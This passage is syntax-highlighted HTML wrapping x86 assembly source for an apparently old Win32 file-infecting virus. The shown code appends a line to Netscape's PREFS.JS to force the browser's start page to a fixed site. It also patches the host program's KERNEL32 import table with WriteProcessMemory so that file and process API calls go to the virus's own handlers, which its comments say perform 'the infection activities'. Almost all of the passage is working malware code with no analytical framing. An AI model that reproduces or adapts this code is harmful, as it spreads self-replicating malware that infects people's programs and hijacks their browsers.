</span><span class="sc5">NetscapeKeyEnd</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">ReceivingBuffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">NetscapeValue</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DirRoot'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This function adds the line</span><span class="sc0">
</span><span class="sc1">;; user_pref("browser.startup.homepage", "http://www.thehungersite.com");</span><span class="sc0">
</span><span class="sc1">;; to PREFS.JS. In this way, the next time Netscape Navigator is runned, the</span><span class="sc0">
</span><span class="sc1">;; start page will be set to http://www.thehungersite.com</span><span class="sc0">
</span><span class="sc5">ModifyPrefs</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LongBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReceivingBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NetscapePrefsFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SizeNamePrefs</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">; Create a full path to PREFS.JS</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0c0000000h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReceivingBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CreateFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Open PREFS.JS</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">   </span><span class="sc1">; If error, exit</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Relative pointer position (same as INT 21h/AH=42h!)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFilePointer</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Put the file</span><span class="sc0">
                                                        </span><span class="sc1">; pointer at the end</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Close</span><span class="sc0">     </span><span class="sc1">; If error, exit</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LongBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeLineToAdd</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LineToAddToPrefs</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_WriteFile</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Write the line at the</span><span class="sc0">
                                                      </span><span class="sc1">; end of the file</span><span class="sc0">
     </span><span class="sc5">@@Close</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CloseHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close file hangle</span><span class="sc0">
       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">ModifyPrefs</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; PER-PROCESS RESIDENCY: SETTING AND INFECTION</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">ImageBase</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">400000h</span><span class="sc0">

</span><span class="sc5">PatchImportDirectory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; MOV EAX,xxxxxxxx</span><span class="sc0">
</span><span class="sc5">ImageBase2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">400000h</span><span class="sc0">   </span><span class="sc1">; Image base, set on infection time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0"> </span><span class="sc1">; Check if PE header</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">                  </span><span class="sc1">; If not, end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX=Size of import data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; EBX=RVA of import directory header</span><span class="sc0">
</span><span class="sc5">@@SearchModule</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; ESI=RVA to the module name</span><span class="sc0">
 </span><span class="sc5">@@ToLowerCase</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the first four characters</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ToLower</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'nrek'</span><span class="sc0">    </span><span class="sc1">; Is it 'kern'?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextModule</span><span class="sc0">     </span><span class="sc1">; If not, it's not kernel32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get next 4 chars</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ToLower</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'23le'</span><span class="sc0">    </span><span class="sc1">; 'el32'?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Found</span><span class="sc0">          </span><span class="sc1">; If it is, we've found KERNEL32</span><span class="sc0">
 </span><span class="sc5">@@NextModule</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">       </span><span class="sc1">; Next module in import directory</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">       </span><span class="sc1">; Have we finished?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@SearchModule</span><span class="sc0">   </span><span class="sc1">; If not, scan next module</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">            </span><span class="sc1">; Finish if we arrived to the end</span><span class="sc0">

      </span><span class="sc5">@@Found</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the RVA to the array of imported</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; functions in ESI</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FunctionsToPatch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">@@Loop_001</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">                  </span><span class="sc1">; Load RVA to function</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If 0, error, so exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">       </span><span class="sc1">; Check that address with the ones got</span><span class="sc0">
                </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">          </span><span class="sc1">; directly from KERNEL32</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessInImport</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
              </span><span class="sc1">;  jmp   @@Loop_001</span><span class="sc0">
       </span><span class="sc5">@@Next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; If someone coincides, patch it with</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">FunctionsAddress</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ours</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordToWrite</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordToWrite</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetCurrentProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_WriteProcessMemory</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc1">;  mov     [esi-4], eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0">       </span><span class="sc1">; Next function in the import array</span><span class="sc0">
       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PatchImportDirectory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DwordToWrite</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FunctionsAddress</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_GetProcAddress</span><span class="sc0">       </span><span class="sc1">; This ones are the addresses to the</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_CreateFileA</span><span class="sc0">          </span><span class="sc1">; per-process functions. This addresses</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_CreateProcessA</span><span class="sc0">       </span><span class="sc1">; plus the delta offset are stored into</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_FindFirstFileA</span><span class="sc0">       </span><span class="sc1">; the array of imported functions to</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_FindNextFileA</span><span class="sc0">        </span><span class="sc1">; patch them, so if the host call any</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_GetFileAttributesA</span><span class="sc0">   </span><span class="sc1">; of this functions the virus takes</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_SetFileAttributesA</span><span class="sc0">   </span><span class="sc1">; the control and performs the infec-</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_GetFullPathNameA</span><span class="sc0">     </span><span class="sc1">; tion activities.</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_MoveFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_CopyFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_DeleteFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_WinExec</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My__lopen</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_MoveFileExA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_OpenFile</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">My_ExitProcess</span><span class="sc0">

</span><span class="sc1">;,,,,,,,,,,,,,,,,,,,,,,,,,</span><span class="sc0">
</span><span class="sc1">;; PER-PROCESS FUNCTIONS ;</span><span class="sc0">
</span><span class="sc1">;'''''''''''''''''''''''''</span><span class="sc0">
</span><span class="sc5">GetDelta</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0"> </span><span class="sc1">; This is set on run-time, at the</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; beginning. It's shorter than making</span><span class="sc0">
</span><span class="sc5">DeltaOffset2</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; a CALL/POP/SUB in every function</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetDelta</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">; GetProcAddress: Patching this we ensure that the host receives our function</span><span class="sc0">
</span><span class="sc1">;                 address rather than the KERNEL32 one. In this way, if</span><span class="sc0">
</span><span class="sc1">;                 GetProcAddress is used over one of the patched functions to</span><span class="sc0">
</span><span class="sc1">;                 call that address directly, it'll call our function first.</span><span class="sc0">
</span><span class="sc5">My_GetProcAddress</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0"> </span><span class="sc1">; EAX=Delta offset</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Save ECX</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@ReturnHere</span><span class="sc0"> </span><span class="sc1">; Calculate return</span><span class="sc0">
                                                         </span><span class="sc1">; address</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Put it on ECX...</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ...and substitute the return</span><span class="sc0">
                                             </span><span class="sc1">; into the stack by ours.</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save the real return address</span><span class="sc0">
                                             </span><span class="sc1">; in [ReturnGetProcAddress]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; Restore ECX</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">  </span><span class="sc1">; Get delta in EAX...</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_GetProcAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; and jump to</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; GetProcAddress, but return...</span><span class="sc0">
                                         </span><span class="sc1">; ...here!</span><span class="sc0">
        </span><span class="sc5">@@ReturnHere</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">ReturnGetProcAddress</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Push return to host (set before)</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX=0?</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">   </span><span class="sc1">; Error, so return</span><span class="sc0">
                        </span><span class="sc6">pushad</span><span class="sc0">           </span><span class="sc1">; Save all</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Save function address</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EBP=Delta offset</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Restore function address</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetProcAddress</span><span class="sc4">]</span><span class="sc0">
                                              </span><span class="sc1">; ESI=Begin address of functions</span><span class="sc0">
